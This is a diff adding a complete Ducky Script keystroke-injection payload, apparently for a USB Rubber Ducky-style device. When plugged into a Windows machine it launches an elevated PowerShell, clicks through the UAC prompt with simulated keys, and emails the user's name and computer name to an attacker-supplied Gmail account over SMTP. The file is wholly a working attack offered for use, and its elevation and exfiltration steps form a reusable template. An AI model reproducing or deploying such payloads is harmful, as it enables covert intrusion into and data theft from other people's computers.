@@ -1,0 +1,25 @@
+REM Author: Ramtin
+REM Description: Retrieves the current user's username and computer name, sends it via email, and closes PowerShell.
+REM Version: 2.2
+REM Category: User Information
+
+DELAY 500
+WINDOWS d
+DELAY 500
+WINDOWS r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 800
+LEFTARROW
+ENTER
+DELAY 800
+ALT y
+DELAY 500
+GUI UP
+DELAY 600
+STRING $username = $env:UserName; $computerName = $env:COMPUTERNAME; $emailBody = "The current user's username is: $username`nComputer name is: $computerName"; $password = ConvertTo-SecureString "APP PASS KEY" -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential ("YOURmail@gmail.com", $password); Send-MailMessage -To "YOURmail@gmail.com" -From "YOURmail@gmail.com" -Subject "Current User's Username and Computer Name" -Body $emailBody -SmtpServer "smtp.gmail.com" -Port 587 -Credential $cred -UseSsl
+ENTER
+DELAY 500
+STRING exit
+ENTER
